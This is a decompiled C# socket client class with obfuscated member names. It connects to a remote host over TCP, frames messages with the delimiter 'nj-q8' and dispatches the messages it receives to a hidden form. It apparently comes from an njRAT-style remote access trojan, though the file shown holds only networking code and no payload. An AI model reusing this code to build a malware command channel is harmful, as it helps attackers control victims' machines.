using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using n.Delegates.T;
using n.My;

namespace n;

public class SocketsClient
{
	public delegate void onConnectEventHandler();

	public delegate void onErrorEventHandler(string Description);

	public delegate void onDataArrivalEventHandler(byte[] Data, int TotalBytes);

	public delegate void onDisconnectEventHandler();

	public delegate void onSendCompleteEventHandler(int DataSize);

	private onConnectEventHandler onConnectEvent;

	private onErrorEventHandler onErrorEvent;

	private onDataArrivalEventHandler onDataArrivalEvent;

	private onDisconnectEventHandler onDisconnectEvent;

	private onSendCompleteEventHandler onSendCompleteEvent;

	private static string response = string.Empty;

	private static int port;

	private static IPHostEntry ipHostInfo;

	private static IPAddress ipAddress;

	private static Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

	private byte[] Spl;

	private static int ct;

	public event onConnectEventHandler onConnect
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			onConnectEvent = (onConnectEventHandler)Delegate.Combine(onConnectEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			onConnectEvent = (onConnectEventHandler)Delegate.Remove(onConnectEvent, value);
		}
	}

	public event onErrorEventHandler onError
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			onErrorEvent = (onErrorEventHandler)Delegate.Combine(onErrorEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			onErrorEvent = (onErrorEventHandler)Delegate.Remove(onErrorEvent, value);
		}
	}

	public event onDataArrivalEventHandler onDataArrival
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			onDataArrivalEvent = (onDataArrivalEventHandler)Delegate.Combine(onDataArrivalEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			onDataArrivalEvent = (onDataArrivalEventHandler)Delegate.Remove(onDataArrivalEvent, value);
		}
	}

	public event onDisconnectEventHandler onDisconnect
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			onDisconnectEvent = (onDisconnectEventHandler)Delegate.Combine(onDisconnectEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			onDisconnectEvent = (onDisconnectEventHandler)Delegate.Remove(onDisconnectEvent, value);
		}
	}

	public event onSendCompleteEventHandler onSendComplete
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			onSendCompleteEvent = (onSendCompleteEventHandler)Delegate.Combine(onSendCompleteEvent, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			onSendCompleteEvent = (onSendCompleteEventHandler)Delegate.Remove(onSendCompleteEvent, value);
		}
	}

	public SocketsClient()
	{
		Spl = STB("nj-q8");
	}

	public void AT(byte[] D)
	{
		MyProject.MyForms forms = MyProject.Forms;
		Form Frm = (Form)(object)forms.B;
		T.appendText(ref Frm, ref D);
		forms.B = (B)(object)Frm;
	}

	public void Connect(string RemoteHostName, int RemotePort)
	{
		try
		{
			client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			port = RemotePort;
			ipHostInfo = Dns.Resolve(RemoteHostName);
			ipAddress = ipHostInfo.AddressList[0];
			IPEndPoint remoteEP = new IPEndPoint(ipAddress, port);
			client.BeginConnect(remoteEP, sockConnected, client);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			onDisconnectEvent?.Invoke();
			ProjectData.ClearProjectError();
		}
	}

	public void SendData(byte[] Data)
	{
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(Data, 0, Data.Length);
			memoryStream.Write(Spl, 0, Spl.Length);
			memoryStream.ToArray();
			client.Send(memoryStream.ToArray(), memoryStream.ToArray().Length, SocketFlags.None);
			memoryStream.Dispose();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void Disconnect()
	{
		try
		{
			client.Shutdown(SocketShutdown.Both);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			client.Close();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public byte[] STB(string Data)
	{
		return Encoding.Default.GetBytes(Data);
	}

	public string BTS(byte[] Data)
	{
		return Encoding.Default.GetString(Data);
	}

	private void sockConnected(IAsyncResult ar)
	{
		checked
		{
			try
			{
				if (!client.Connected)
				{
					onDisconnectEvent?.Invoke();
					return;
				}
				client.ReceiveBufferSize = 99999;
				client.ReceiveTimeout = -1;
				client.SendTimeout = -1;
				ct++;
				Thread thread = new Thread(DDD);
				thread.Start();
				onConnectEvent?.Invoke();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				onDisconnectEvent?.Invoke();
				ProjectData.ClearProjectError();
			}
		}
	}

	public void DDD()
	{
		int num = ct;
		MemoryStream memoryStream = new MemoryStream();
		checked
		{
			int num2 = default(int);
			while (true)
			{
				num2++;
				Thread.Sleep(5);
				if (num < ct)
				{
					break;
				}
				try
				{
					if (num2 > 200)
					{
						try
						{
							if (client.Poll(-1, SelectMode.SelectRead) & (client.Available <= 0))
							{
								MyProject.Forms.B.Dis();
								break;
							}
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							MyProject.Forms.B.Dis();
							ProjectData.ClearProjectError();
							break;
						}
						num2 = 0;
					}
					if (client.Available <= 0)
					{
						continue;
					}
					byte[] array = new byte[client.Available - 1 + 1];
					client.Receive(array, array.Length, SocketFlags.None);
					if (Strings.InStr(BTS(array), "nj-q8", (CompareMethod)0) > 0)
					{
						memoryStream.Write(array, 0, array.Length);
						Thread thread = new Thread(delegate(object a0)
						{
							EFE((byte[])a0);
						});
						thread.Start(memoryStream.ToArray());
						memoryStream = new MemoryStream();
					}
					else
					{
						memoryStream.Write(array, 0, array.Length);
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	public void EFE(byte[] B)
	{
		onDataArrivalEvent?.Invoke(B, checked(B.Length - 1));
	}

	private void sockSendEnd(IAsyncResult ar)
	{
		try
		{
			Socket socket = (Socket)ar.AsyncState;
			int dataSize = socket.EndSend(ar);
			onSendCompleteEvent?.Invoke(dataSize);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			onErrorEvent?.Invoke(Information.Err().get_Description());
			ProjectData.ClearProjectError();
		}
	}

	public bool Connected()
	{
		try
		{
			return client.Connected;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
